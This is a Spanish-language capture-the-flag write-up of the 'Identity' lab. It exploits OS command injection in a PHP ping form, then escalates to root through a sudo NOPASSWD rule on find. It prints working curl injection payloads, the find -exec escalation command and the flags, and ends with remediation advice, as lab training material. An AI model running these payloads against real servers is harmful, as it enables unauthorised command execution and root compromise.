---
title: "WhoamI Labs - Identity (Junior Checklist #1)"
date: 2026-08-09 22:00:00 +0000
categories: [CTF, WhoamiLabs]
tags: [linux, web, command-injection, privesc, sudo-misconfig]
---

## 📋 Resumen Ejecutivo

El laboratorio "Identity" expone una aplicación web PHP que simula una herramienta de diagnóstico de red. La aplicación es vulnerable a **OS Command Injection (CWE-78)** en el parámetro `target`, lo que permite ejecución remota de comandos (RCE) sin autenticación. Adicionalmente, el usuario comprometido (`web-admin`) cuenta con permisos de **sudo mal configurados** sobre el binario `/usr/bin/find`, lo que permite una escalada de privilegios trivial a `root` mediante la técnica documentada en GTFOBins.

| Campo | Valor |
|---|---|
| Plataforma | WhoamI Labs |
| Dificultad | Fácil (★☆☆☆☆☆☆☆) |
| IP objetivo | 172.17.0.2 |
| Vulnerabilidad principal | OS Command Injection → Privilege Escalation |

![Lanzamiento del laboratorio](/assets/img/posts/identity-whoami-labs/01-intro-objetivo.png)

## 🔍 Reconocimiento

```bash
nmap -sV -sC -p- 172.17.0.2 -oN recon_identity.txt
```
PORT STATE SERVICE VERSION
80/tcp open http Apache httpd 2.4.52 ((Ubuntu))

![Escaneo nmap](/assets/img/posts/identity-whoami-labs/02-nmap-recon.png)

Única superficie expuesta es HTTP en el puerto 80. La página raíz responde con el default de Apache, indicando que la app real vive en una ruta no enlazada.

## 🕸️ Enumeración

```bash
gobuster dir -u http://172.17.0.2 -w /usr/share/wordlists/dirb/common.txt -x php,html,txt
```
index.php (Status: 200) [Size: 1266]
index.html (Status: 200) [Size: 10671]

![Gobuster](/assets/img/posts/identity-whoami-labs/03-gobuster-enum.png)

`index.php` responde con tamaño distinto al `index.html` por defecto de Apache — confirma una aplicación PHP real detrás de la página decorativa.

![Formulario visto en el navegador](/assets/img/posts/identity-whoami-labs/10-browser-baseline.png)

## 💥 Explotación — Command Injection

**Baseline (comportamiento normal):**

```bash
curl -s http://172.17.0.2/index.php -d "target=127.0.0.1" -o baseline.html
```

![Baseline](/assets/img/posts/identity-whoami-labs/04-baseline-curl.png)

**Confirmación de la vulnerabilidad:**

```bash
curl -s http://172.17.0.2/index.php -d "target=127.0.0.1; whoami;"
```
rtt min/avg/max/mdev = 0.024/0.045/0.067/0.021 ms
web-admin

![Confirmación command injection](/assets/img/posts/identity-whoami-labs/05-whoami-injection-curl.png)
![Confirmación desde el navegador](/assets/img/posts/identity-whoami-labs/06-whoami-injection-browser.png)

> ⚠️ **Nota técnica:** el carácter `&` rompe el parseo del shell del backend (probable filtro parcial). Se evitó su uso en payloads posteriores.

## 🚩 Flag de usuario

```bash
curl -s http://172.17.0.2/index.php -d "target=127.0.0.1; id; pwd;"
```

`uid=1000(web-admin) gid=1000(web-admin) groups=1000(web-admin)` | `/var/www/html`

![Contexto del sistema](/assets/img/posts/identity-whoami-labs/07-context-id-pwd.png)

```bash
curl -s http://172.17.0.2/index.php -d "target=127.0.0.1; ls -la /home/web-admin/;"
```

Localiza `user.txt`. Lectura final:

```bash
curl -s http://172.17.0.2/index.php -d "target=127.0.0.1; cat /home/web-admin/user.txt;"
```

**Flag:** `Identity{3num34t1on_1s_th3_k3y}`

![Flag de usuario vía curl](/assets/img/posts/identity-whoami-labs/12-userflag-curl.png)
![Flag de usuario en el navegador](/assets/img/posts/identity-whoami-labs/11-userflag-browser.png)

## ⬆️ Escalada de Privilegios

```bash
curl -s http://172.17.0.2/index.php -d "target=127.0.0.1; sudo -l;"
```
User web-admin may run the following commands on cb1192f9bd56:
(ALL) NOPASSWD: /usr/bin/find

![sudo -l](/assets/img/posts/identity-whoami-labs/13-sudo-l-output.png)

`find` es un binario catalogado en [GTFOBins](https://gtfobins.github.io/gtfobins/find/) como vector de escalada, ya que su flag `-exec` hereda los privilegios de sudo.

```bash
curl -s http://172.17.0.2/index.php -d "target=127.0.0.1; sudo /usr/bin/find /etc/hostname -exec ls -la /root/ \;"
```
-r-------- 1 root root 33 Apr 18 12:52 flag.txt

![Listado de /root/](/assets/img/posts/identity-whoami-labs/14-listroot-flag-found.png)

## 🚩 Flag de Root

```bash
curl -s http://172.17.0.2/index.php -d "target=127.0.0.1; sudo /usr/bin/find /etc/hostname -exec cat /root/flag.txt \;"
```

**Flag:** `Identity{p0w3r_0f_th3_checklist}`

![Flag de root](/assets/img/posts/identity-whoami-labs/16-rootflag-curl.png)
![Laboratorio completado](/assets/img/posts/identity-whoami-labs/15-lab-completed-validation.png)

## 🛡️ Remediación

1. **Command Injection:** validar el input como IP con `filter_var($ip, FILTER_VALIDATE_IP)`; nunca concatenar directo en `shell_exec()`.
2. **Sudo Misconfiguration:** evitar `NOPASSWD` sobre binarios con capacidad de ejecución arbitraria (`find`, `vim`, `awk`, etc. — catalogados en GTFOBins).

## 🧠 Lecciones aprendidas

- El caracter `&` puede romper el shell del backend en filtros mal implementados — útil como técnica de debugging cuando un payload devuelve vacío.
- `find` con sudo `NOPASSWD` es uno de los vectores de privesc más comunes y rápidos de verificar — siempre correr `sudo -l` como primer paso en cualquier post-explotación.
